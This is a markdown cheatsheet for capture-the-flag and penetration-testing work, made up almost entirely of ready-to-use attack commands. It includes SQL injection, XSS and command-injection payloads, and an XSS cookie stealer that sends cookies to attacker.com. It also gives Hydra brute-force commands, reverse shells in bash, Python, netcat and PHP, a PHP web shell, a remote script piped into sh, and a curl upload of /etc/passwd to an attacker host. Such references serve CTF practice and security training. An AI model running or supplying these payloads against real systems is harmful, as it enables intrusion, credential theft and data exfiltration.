# CTF Cheatsheet - Quick Reference Guide

## 🔍 Reconnaissance

### Nmap
```bash
# Quick scan
nmap -sV -sC target.com

# Full port scan
nmap -p- target.com

# Aggressive scan
nmap -A target.com

# Scan all ports with service detection
nmap -p- -sV -sC -oN scan.txt target.com

# UDP scan (slow)
nmap -sU -sV target.com

# Scan specific ports
nmap -p 80,443,8080 target.com
```

### Directory Enumeration
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Dirb
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# FFuF
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Subdomain Enumeration
```bash
# Subfinder
subfinder -d target.com

# FFuF
ffuf -u http://FUZZ.target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## 🌐 Web Application Testing

### SQL Injection
```bash
# Basic SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs

# With POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --dbs

# Dump database
sqlmap -u "http://target.com/page?id=1" -D database_name --dump

# Common SQL injection payloads
' OR '1'='1
' OR 1=1--
admin' --
' UNION SELECT NULL--
```

### XSS (Cross-Site Scripting)
```javascript
// Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))</script>

// Cookie stealer
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### Command Injection
```bash
# Common separators
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# Filter bypasses
cat${IFS}/etc/passwd
cat</etc/passwd
c'a't /etc/passwd
```

### LFI/RFI (Local/Remote File Inclusion)
```bash
# LFI
../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd
php://filter/convert.base64-encode/resource=index.php

# RFI
http://attacker.com/shell.txt
```

### XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

## 🔐 Password Cracking

### John the Ripper
```bash
# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Crack different formats
john --format=raw-md5 hash.txt
```

### Hashcat
```bash
# MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA-256
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat -m 0 hash.txt --show
```

### Hydra (Online Attacks)
```bash
# SSH
hydra -l admin -P passwords.txt ssh://target.com

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP
hydra -l admin -P passwords.txt ftp://target.com
```

## 🐚 Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Netcat
```bash
nc -e /bin/bash 10.10.14.5 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

### PHP
```php
<?php system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
```

### Listener
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444  # Better shell with history
```

## 🔧 Shell Stabilization
```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then:
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

## 🔍 Linux Privilege Escalation

### Enumeration
```bash
# Current user info
id
whoami
groups

# SUID files
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null

# Check sudo
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Running processes
ps aux
ps auxww

# Network connections
netstat -tulpn
ss -tulpn
```

### Common Exploits
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# GTFOBins for SUID/sudo abuse
# https://gtfobins.github.io/
```

## 🔓 File Transfer

### Download to Target
```bash
# wget
wget http://attacker.com/file

# curl
curl http://attacker.com/file -o file

# Python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://attacker.com/file", "file")'

# Netcat
# On attacker: nc -lvnp 4444 < file
# On target: nc attacker.com 4444 > file
```

### Upload from Target
```bash
# Python HTTP server (on target)
python3 -m http.server 8000

# curl upload
curl -X POST -F "file=@/etc/passwd" http://attacker.com

# Netcat
# On attacker: nc -lvnp 4444 > file
# On target: nc attacker.com 4444 < file
```

## 🔐 Cryptography

### Base64
```bash
# Encode
echo "text" | base64

# Decode
echo "dGV4dAo=" | base64 -d
```

### Hash Identification
```bash
# hashid
hashid hash.txt

# hash-identifier
hash-identifier
```

### Common Encoding/Decoding
```bash
# URL encode
echo "text" | jq -sRr @uri

# URL decode
echo "text%20here" | python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.stdin.read()))"

# Hex to ASCII
echo "68656c6c6f" | xxd -r -p

# ASCII to Hex
echo "hello" | xxd -p
```

## 🕵️ Forensics

### File Analysis
```bash
# File type
file suspicious_file

# Strings
strings suspicious_file

# Binwalk (embedded files)
binwalk suspicious_file
binwalk -e suspicious_file  # Extract

# ExifTool (metadata)
exiftool image.jpg

# Foremost (file carving)
foremost suspicious_file
```

### Steganography
```bash
# Steghide (extract hidden data)
steghide extract -sf image.jpg

# Stegsolve (Java tool for image analysis)
stegsolve image.png

# zsteg (PNG/BMP)
zsteg image.png
```

### Network Analysis
```bash
# Wireshark filters
http.request.method == "POST"
tcp.port == 80
ip.addr == 10.10.10.10

# tcpdump
tcpdump -r capture.pcap
tcpdump -A -r capture.pcap  # ASCII output
```

## 💾 Binary Exploitation

### GDB/pwndbg
```bash
# Run with pwndbg
gdb ./binary

# Common commands
run
disassemble main
break main
continue
info registers
x/20wx $esp
checksec
```

### Find Offset (Buffer Overflow)
```bash
# Create pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41424344
```

### ROPgadget
```bash
ROPgadget --binary binary_file
ROPgadget --binary binary_file --ropchain
```

## 🎯 Useful One-Liners

```bash
# Find files modified in last day
find / -mtime -1 -type f 2>/dev/null

# Search for passwords in files
grep -r -i "password" /home 2>/dev/null

# Find all readable files
find / -readable -type f 2>/dev/null

# Get public IP
curl ifconfig.me

# Create Python HTTP server
python3 -m http.server 8000

# Port forwarding with SSH
ssh -L local_port:target:target_port user@pivot

# Reverse port forwarding
ssh -R remote_port:localhost:local_port user@remote
```

## 📚 Resources

- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)
- [RevShells](https://www.revshells.com/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [Exploit-DB](https://www.exploit-db.com/)
